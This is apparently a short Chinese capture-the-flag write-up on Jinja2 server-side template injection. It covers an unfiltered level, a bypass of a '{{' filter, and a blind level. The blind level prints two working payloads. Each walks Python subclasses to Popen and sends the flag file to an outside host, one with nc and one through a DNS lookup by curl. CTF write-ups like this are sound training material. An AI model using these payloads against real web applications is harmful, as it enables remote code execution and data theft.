Level1-no waf
首先编写脚本寻找可以RCE的内建函数
![no waf 1](/hello_ctf/images/ssti1.png)
![no waf 2](/hello_ctf/images/ssti2.png)
使用寻找到的下标索引进行注入
![no waf 3](/hello_ctf/images/ssti3.png)

Level2-['\{\{'] 
过滤了{{,那就使用{% %}
![['\{\{'] 1](/hello_ctf/images/ssti4.png)
![['\{\{'] 2](/hello_ctf/images/ssti5.png)

Level3-no waf and bind
盲注,首先需要知道可以利用的类的名字,使用模板语法更加方便
{% for i in ''.__class__.__mro__[-1].__subclasses__() %}
{% if i.__name__ == 'Popen' %}
{{ i.__init__.__globals__['os'].popen('cat flag|nc IP 8080').read() }}
{% endif %}
{% endfor %}
or
{% for i in ''.__class__.__mro__[-1].__subclasses__() %}
{% if i.__name__=='Popen' %}
{{ i.__init__.__globals__['os'].popen('curl `cat flag`.b5orv752.eyes.sh').read()}}
{% endif %}
{% endfor %}

